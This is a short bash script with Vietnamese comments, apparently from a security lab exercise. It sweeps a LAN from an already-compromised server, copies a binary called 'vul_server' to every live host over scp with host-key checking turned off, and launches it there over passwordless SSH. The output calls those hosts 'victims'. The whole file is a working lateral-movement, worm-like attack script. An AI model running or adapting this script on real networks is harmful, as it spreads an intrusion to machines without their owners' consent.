#!/bin/bash

# 1. Định vị file vul_server trên máy server (nơi đang bị reverse shell)
VUL_SERVER="./vul_server"

# 2. Xác định dải mạng LAN (ví dụ 192.168.207.0/24)
SUBNET="192.168.42"

# 3. Quét các host đang sống
echo "[*] Scanning LAN for potential victims..."
for ip in $(seq 1 254); do
    ping -c 1 -W 1 $SUBNET.$ip > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Host $SUBNET.$ip is up"

        # 4. Thử gửi file vul_server (nếu máy victim mở SSH)
        scp -o StrictHostKeyChecking=no $VUL_SERVER $SUBNET.$ip:/tmp/ 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Successfully sent vul_server to $SUBNET.$ip"

            # 5. SSH vào victim và chạy ./vul_server 5000 (nếu SSH không có mật khẩu)
            ssh -o StrictHostKeyChecking=no $SUBNET.$ip "chmod +x /tmp/vul_server && /tmp/vul_server 5000 &" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[*] Successfully started vul_server on victim $SUBNET.$ip"
            else
                echo "[-] Cannot execute vul_server remotely on $SUBNET.$ip"
            fi
        else
            echo "[-] Failed to send vul_server to $SUBNET.$ip"
        fi
    fi
done
